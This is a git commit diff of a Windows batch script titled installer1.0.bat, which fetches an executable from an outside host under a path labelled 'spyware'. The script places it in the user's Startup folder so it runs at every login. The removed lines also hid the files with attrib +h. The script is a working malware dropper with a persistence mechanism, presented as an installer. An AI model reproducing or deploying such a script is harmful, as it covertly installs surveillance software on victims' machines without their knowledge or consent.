230167188589aa33fd6fffe1b2d2e8f1a1ed738d
o89.Devsu <harimtim@icloud.com>
2024-06-10 19:50:12 +0200

    Update installer1.0.bat

--- installer1.0.bat
+++ installer1.0.bat
@@ -1,12 +1,8 @@
-curl -O http://harimtim.de/spyware/1.0/spy.exe 
-curl -O http://harimtim.de/spyware/1.0/email.ico
+curl -O http://harimtim.de/spyware/1.0/spyware.exe 
 
-move spy.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
-move email.ico "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+move spyware.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" 
 
-attrib +h spy.exe
-attrib +h email.ico
 
 exit
